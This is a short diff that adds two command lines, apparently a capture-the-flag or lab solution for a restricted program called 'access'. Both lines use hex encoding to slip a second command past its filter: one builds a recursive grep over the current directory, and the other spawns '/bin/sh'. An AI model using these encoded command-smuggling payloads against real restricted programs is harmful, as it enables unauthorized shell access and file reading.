@@ -1,0 +1,5 @@
+./access eval '$(printf "\x2fbin\x2fgrep -rI 'a' .")'
+
+or
+
+./access "$'\x2f\x62\x69\x6e\x2f\x73\x68'"
